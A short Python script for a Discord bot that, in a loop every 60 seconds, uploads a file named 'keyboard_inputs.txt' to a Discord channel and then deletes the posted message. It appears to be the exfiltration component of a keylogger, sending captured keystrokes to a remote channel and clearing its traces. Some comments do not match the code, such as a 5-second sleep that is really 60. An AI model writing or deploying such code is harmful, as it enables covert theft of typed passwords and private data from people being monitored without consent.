import discord
import asyncio
import os

time = 60

client = discord.Client(intents=discord.Intents.all())

@client.event
async def on_ready():
    print("Logged in as")
    print(client.user.name)
    print(client.user.id)
    print("------")
    while True:
        file_path = "keyboard_inputs.txt"
        # Open the file and read its contents
        with open(file_path, 'r') as f:
            file_contents = f.read()
        # Send the file to the "pc-status" channel
        channel = discord.utils.get(client.get_all_channels(), name='CHANNEL NAME')
        message = await channel.send(file=discord.File(file_path))  # store the message in a variable
        # delete the file
        os.remove(file_path)
        # create the file again
        with open(file_path, 'w') as f:
            f.write(file_contents)
            f.write("\n") # add new line character
        await asyncio.sleep(time)  # Sleep for 5 seconds before sending the file again
        await message.delete()  # delete the previous message

client.run("ur discord token")
